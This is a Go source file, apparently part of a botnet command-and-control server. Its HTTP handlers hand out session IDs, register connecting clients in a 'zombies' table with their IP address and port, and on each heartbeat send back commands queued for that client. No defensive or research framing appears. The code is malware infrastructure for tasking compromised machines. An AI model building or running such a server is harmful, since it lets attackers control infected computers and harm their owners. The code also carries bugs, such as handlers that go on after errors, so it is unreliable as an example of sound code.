package main

import (
	"database/sql"
	"encoding/json"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// /////// ROUTES PROCESSING /////////
func HelloWorld(w http.ResponseWriter, req *http.Request) {
	logPrefix := "[HELLOWORLD] "
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(logPrefix + "Hello World!\n"))
}

func GetSID(w http.ResponseWriter, req *http.Request) {
	logPrefix := "[GETSID] "
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	ipHeader := req.RemoteAddr
	sid := createSID(10)
	DbgMsgEx((logPrefix + "From " + ipHeader + "=> GET /getSID SID: " + sid), true)
	res := ResGetSID{SessionId: sid, WelcomeMsg: "Welcome aboard:)"}

	jsonData, err := json.Marshal(res)
	if err != nil {
		DbgMsgEx((logPrefix + "Error JSON marshalling: " + err.Error()), true)
		w.WriteHeader(http.StatusInternalServerError)

	}
	w.Write([]byte(jsonData))
}

func Register(db sql.DB) http.HandlerFunc {

	return func(w http.ResponseWriter, req *http.Request) {
		logPrefix := "[REGISTER] "
		currentTime := time.Now()
		DbgMsg(logPrefix + "Current timestamp: " + strconv.FormatInt(currentTime.Unix(), 10))
		body, err := io.ReadAll(req.Body)
		if err != nil {
			DbgMsgEx((logPrefix + "Error reading body: " + err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
		}
		DbgMsg((logPrefix + "Body is: " + string(body)))
		var reqREG ReqRegister
		err = json.Unmarshal(body, &reqREG)
		if err != nil {
			DbgMsgEx((logPrefix + "Error parsing body: " + err.Error()), true)
			w.WriteHeader(http.StatusBadRequest)
		}
		sid := reqREG.SessionId
		country := "US"
		remoteAddr := req.RemoteAddr
		splittedRemoteAddr := strings.Split(remoteAddr, ":")
		ipv4 := splittedRemoteAddr[0]
		port := splittedRemoteAddr[1]
		username := "zombie"
		lastConnTime := currentTime
		LogEx(logPrefix+"New client registered: <"+sid+">"+" ["+remoteAddr+"]", true)

		query := "INSERT INTO zombies (SessionId, RemoteAddr, RemotePort, UserName, Country, FirstConnTime, LastConnTime ) VALUES (?,?,?,?,?,?,?)"
		DbgMsg(logPrefix + "Query: " + query)
		_, err = db.Query(query, sid, ipv4, port, username, country, currentTime, lastConnTime)
		DbgMsg(logPrefix + "Test")
		if err != nil {
			DbgMsgEx((logPrefix + "Error inserting row: " + err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		resREG := ResRegister{"Client succesfully registered !"}
		resBody, err := json.Marshal(resREG)
		if err != nil {
			DbgMsgEx((logPrefix + "Error parsing body: " + err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		DbgMsg(logPrefix + "Response body: " + string(resBody))
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Write(resBody)

	}
}

func HeartBeat(db *sql.DB) http.HandlerFunc {
	return func(w http.ResponseWriter, req *http.Request) {
		logPrefix := "[HEARTBEAT] "

		currentTimeStamp := time.Now()
		// TODO: CHECK SID VALIDITY
		body, err := io.ReadAll(req.Body)

		DbgMsgEx((logPrefix + "Request body content: " + string(body)), true)

		if err != nil {
			DbgMsgEx((logPrefix + "Error reading request body content: " + err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
		}
		var reqHB ReqHeartBeat
		err = json.Unmarshal(body, &reqHB)
		if err != nil {
			DbgMsgEx((logPrefix + "Error parsing body content: " + err.Error()), true)
		}
		DbgMsgEx(logPrefix+"Request body parsed", true)
		query := "UPDATE zombies SET lastconntime = ? WHERE sessionid = ?"
		_, err1 := db.Query(query, currentTimeStamp, reqHB.SessionId)
		if err1 != nil {
			DbgMsgEx((logPrefix + "Error updating row: " + err1.Error()), true)
		}

		Log(logPrefix + "Searching for commands to send...")
		response := GetCmdFromQueue(reqHB.SessionId, db)
		if response.Type == "" {
			DbgMsgEx(logPrefix+"Error no command to send", true)
		}
		//resHB := ResHeartBeat{reqHB.SessionId, "empty", []interface{}{}}

		resBody, err := json.Marshal(response)
		if err != nil {
			DbgMsgEx((logPrefix + "Error parsing response body: " + err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		DbgMsg(logPrefix + "Serialized response body: " + string(resBody))
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Write(resBody)

	}
}
